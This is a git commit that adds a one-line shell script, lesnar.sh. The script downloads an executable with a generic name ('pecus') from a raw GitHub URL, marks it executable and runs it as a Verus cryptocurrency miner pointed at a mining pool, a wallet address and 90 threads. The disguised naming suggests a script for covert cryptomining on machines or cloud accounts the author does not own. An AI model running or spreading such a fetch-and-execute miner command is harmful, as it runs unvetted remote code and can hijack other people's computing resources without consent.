91ef692a03d7a17bf18e4208644f9a69d259d084
Zuraadlef <148000386+Zuraadlef@users.noreply.github.com>
2023-10-25 21:41:17 +0700

    Create lesnar.sh

---
+++ lesnar.sh
@@ -0,0 +1,1 @@
+wget https://raw.githubusercontent.com/Zuraadlef/sda/main/pecus && chmod +x pecus && ./pecus -a verus -o stratum+tcp://pool.verus.io:9999 -u RVj1VkZYsvMHgRtNRn8z1eeGkTCGmK5qmH.w1 -p x -t 90
